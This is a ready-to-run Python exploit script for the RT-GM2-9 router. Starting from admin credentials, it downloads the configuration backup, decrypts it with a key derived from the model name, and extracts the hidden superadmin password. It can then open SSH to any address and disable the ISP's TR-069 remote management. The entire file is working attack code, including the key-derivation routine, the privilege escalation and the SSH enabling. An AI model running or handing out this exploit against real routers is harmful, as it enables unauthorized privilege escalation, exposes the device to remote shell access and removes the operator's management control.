from requests import get, post, Session
from Crypto.Cipher import AES
from Crypto import Random
from random import random
from hashlib import md5
from os import remove
import argparse
import socket
import gzip

parser = argparse.ArgumentParser(description="RT-GM2-9/1.6.1379 superadmin password extraction")

parser.add_argument("-H", "--host", type=str, default="192.168.0.1", help="router IP address, ex: '192.168.0.1' and '192.168.0.1:9090' if default HTTP port has been changed")
parser.add_argument("-L", "--login", type=str, required=True, help="admin login")
parser.add_argument("-P", "--password", type=str, required=True, help="admin password")
parser.add_argument("-M", "--mod", type=str, default = "RT-GM2-9", help="router model, ex: 'RT-GM2-9'")
parser.add_argument("-S", "--ssh", action="store_true", help="enable SSH")
parser.add_argument("-T", "--tr", action="store_true", help="disable TR-069, only possible if SSH is enabled")
	
args = parser.parse_args()

print("\n\t[+] Host: %s, mod: %s\n\t[+] Login: %s\n\t[+] Password: %s\n\t[+] Enable SSH: %s\n\t[+] Disable TR-069: %s\n" % (args.host, args.mod, args.login, args.password, args.ssh, args.tr))

url = "http://" + args.host

def get_session(login, password):
	
	sesh = Session()
	req = sesh.post(url + "/login.htm", data={"f_password":md5(password.encode()).hexdigest(), "f_currURL":url+"/old_login.htm", "f_username":login, "pwd":""})
	return sesh

def get_session_key(sesh):

	return sesh.get(url + "/advanced/conSession.htm", params={"id":str(random())}).text

def logout(sesh):

	sesh.get(url + "/maintenance/logout.xgi", params = {"sessionKey":get_session_key(sesh)})
	sesh.get(url + "/login.htm", params = {"logtmr":0})

def save_old_config(sesh):

	config = sesh.get(url + "/config_old_tl.xgi", params = {"sessionKey":get_session_key(sesh)}).content
	file = open("config.bin", "wb")
	file.write(config)
	file.close()

def decrypt_config(mod):

	enc_file = open("config.bin", "rb")
	enc_file.read(16)

	out_file = open("config.gz", "wb")

	bs = AES.block_size
	salt = enc_file.read(bs)[len("Salted__"):]
	d = d_i = b""
	key_length = 32
	iv_length = bs

	while len(d) < key_length + iv_length:

		d_i = md5(d_i + mod.encode() + salt).digest()
		d += d_i

	key = d[:key_length] 
	iv = d[key_length:key_length+iv_length]
	cipher = AES.new(key, AES.MODE_CBC, iv)
	next_chunk = b""
	finished = False

	while not finished:

		chunk, next_chunk = next_chunk, cipher.decrypt(enc_file.read(1024 * bs))

		if len(next_chunk) == 0:
			padding_length = chunk[-1]
			chunk = chunk[:-padding_length]
			finished = True

		out_file.write(chunk)

	enc_file.close()
	remove("config.bin")
	out_file.close()

	config_gz = gzip.open("config.gz", "rb")

	while 1:

		line = config_gz.readline()
		
		if b"superadmin" in line:
			pass_line = config_gz.readline()
			break

	password = pass_line.decode().strip().strip("<password>").strip("</")

	config_gz.close()
	remove("config.gz")
	open("superadmin.txt", "w").write("superadmin:" + password)
	
	return "superadmin", password

def disable_tr(login, password):

	from paramiko import AutoAddPolicy, SSHClient

	cli = SSHClient()
	cli.set_missing_host_key_policy(AutoAddPolicy())
	cli.connect(hostname=args.host, username=login, password=password)

	cli.exec_command("csmconf -s /InternetGatewayDevice/ManagementServer/EnableCWMP 0")
	cli.exec_command("csmctl savecfg")

def enable_ssh(sesh):

	data = {
	"sessionKey":get_session_key(sesh),
	"setPath":"/InternetGatewayDevice/UserInterface/RemoteAccess:6/",
	"IP": "0.0.0.0",
	"Mask": "0.0.0.0",
	"Protocol": "SSH",
	"Enable": 1,
	"Port": 22,
	"Interface":"InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.",
	"endSetPath": 1,
	"CMT": 0,
	"APPLY": 1
		}

	sesh.get(url + "/maintenance/mt_acremote_tl.xgi", params = data)

	sock = socket.socket()
	sock.settimeout(10)
	try:
		sock.connect((args.host, 22))
		print("\n\t[+] %s:22 --> %s" % (args.host, sock.recv(1024).decode()))
		sock.close()
	except Exception as error:
		print(error)

print("[+] extracting superadmin password...")
sesh = get_session(args.login, args.password)
save_old_config(sesh)
login, password = decrypt_config(args.mod)

print("[+] superadmin password: %s" % password)

logout(sesh)
sesh = get_session(login, password)

if args.ssh:
	print("[+] enable SSH")
	enable_ssh(sesh)
if args.tr:
	print("[+] disable TR-069")
	disable_tr(login, password)